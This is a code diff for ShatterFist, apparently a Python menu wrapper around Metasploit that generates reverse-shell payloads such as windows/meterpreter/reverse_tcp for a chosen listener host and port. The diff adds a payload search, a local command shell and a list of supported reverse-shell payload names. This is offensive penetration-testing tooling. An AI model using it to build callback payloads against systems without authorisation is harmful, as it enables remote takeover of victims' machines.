@@ -6,7 +6,9 @@ import re
 import base64
 import random
 import string 
-import time 
+import time
+
+from colorama.ansi import Style 
 
 
 banner= ('''
@@ -99,7 +101,7 @@ def payloadgen2(payloadandsession, lhost, lport, outfile, args1, args2):
     except:
         print(colorama.Fore.LIGHTRED_EX +  "An error has occured! Please read the above output and make sure you entered the options properly!" + colorama.Style.RESET_ALL)
     else: 
-        print(colorama.Fore.LIGHTGREEN_EX + f"#====================#\nDone! \nSaved as {outfile}\n(If no errors were encountered that is)\n#====================#\n\n" + colorama.Style.RESET_ALL)  
+        print(colorama.Fore.LIGHTGREEN_EX + f"#====================#\nDone!\nSaved as {outfile}\n#====================#\n\n" + colorama.Style.RESET_ALL)  
     finally:
         input(colorama.Fore.LIGHTBLUE_EX + "Press any key to continue" + colorama.Style.RESET_ALL)    
 
@@ -203,7 +205,7 @@ def winpayload():
     #WinMeterpeter    
     if inputwin == "1": 
         print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
-        payloadgen2("windows/meterpreter/reverse_tcp", lhost, lport, winoutfile,f'-a {defaultarch}','-b "\\x00" -f exe')
+        payloadgen2(f"windows/meterpreter/reverse_{talkbackm1}", lhost, lport, winoutfile,f'-a {defaultarch}','-b "\\x00" -f exe')
         menu()
     #WinShell    
     elif inputwin == "2":
@@ -263,7 +265,30 @@ def linuxpayloadmenu():
     else:
         print(colorama.Fore.LIGHTRED_EX + f"ERR: Option {inputy} is not valid" + colorama.Style.RESET_ALL) 
         time.sleep(2)
-        linuxpayloadmenu()   
+        linuxpayloadmenu()  
+
+def shell():
+    clearscreen()
+    print(colorama.Style.BRIGHT + "Type list to show all available commands" +colorama.Style.RESET_ALL)
+    loop = True
+    while loop == True:
+        try:
+            shinput = input(colorama.Fore.RED + colorama.Fore.LIGHTRED_EX + "sfshell> " + Style.RESET_ALL).strip()
+            if shinput == "exit":
+                loop = False
+            else:
+                print(colorama.Fore.BLUE + "[*]Exec" + shinput + colorama.Style.RESET_ALL )
+                subprocess.run(shinput, shell=True)
+        except KeyboardInterrupt:
+            print(colorama.Fore.BLUE + "[" + colorama.Fore.LIGHTWHITE_EX + "*" + colorama.Fore.BLUE  + "]" + colorama.Fore.LIGHTCYAN_EX + "Recieved INTR call exiting..." )
+            time.sleep(0.5)        
+
+def search():
+    searchstring =  inputc("Enter search string: ").strip()
+    matchingplds = [fplds for fplds in pldlist if searchstring in fplds ]  
+    for item in matchingplds:
+        print(colorama.Fore.LIGHTRED_EX + "==>" + colorama.Fore.LIGHTWHITE_EX + item + colorama.Style.RESET_ALL)  
+    inputc("Press enter to return to menu ")   
 
 def menu():
     global n 
@@ -278,6 +303,9 @@ def menu():
     printopt("Android payload menu")
     printopt("Linux payload menu")
     #printopt("Miscellaneous payloads")
+    printopt2("S", "Search for supported payloads")
+    printopt2("A", "Advanced menu shell for access to all supported payloads (recommended) ")
+    #printopt2("C", "Custom payload")
     printopt2("M", "Start the Metasploit Framework Console")
     printopt2("E", "Exit ShatterFist")
     input1 = inputc("Option: ").strip().lower()
@@ -290,10 +318,15 @@ def menu():
 
     elif input1 == "3":
         androidpayload() 
+
     elif input1 == "4":
         linuxpayloadmenu()
+
     elif input1 == "5":
         miscmenu()
+
+    elif input1 == "a" or input1 == "advanced" or input1 == "shell":
+        shell() 
 
     elif input1 == "m" or input1 == "msfconsole":
         clearscreen()
@@ -314,9 +347,18 @@ def menu():
     else:
         print(colorama.Fore.LIGHTRED_EX + f"ERR: Option {input1} is not valid" + colorama.Style.RESET_ALL)
         time.sleep(2)
-        menu()        
-        
+        menu()    
+
+#first main code i didnt put inside a def wrapper lol
+pldlist = []
+pldlist.append("[1] windows/meterpreter/reverse_tcp")
+pldlist.append("[2] windows/meterpreter/reverse_https")
+pldlist.append("windows/shell/reverse_tcp")
+pldlist.append("python/meterpreter/reverse_tcp") 
+pldlist.append("python/meterpreter/reverse_https")
+pldlist.append("python/shell_reverse_tcp") 
 def main():
+    #there for future stuff
     time.sleep(0.1)
     menu()
 colorama.init()    
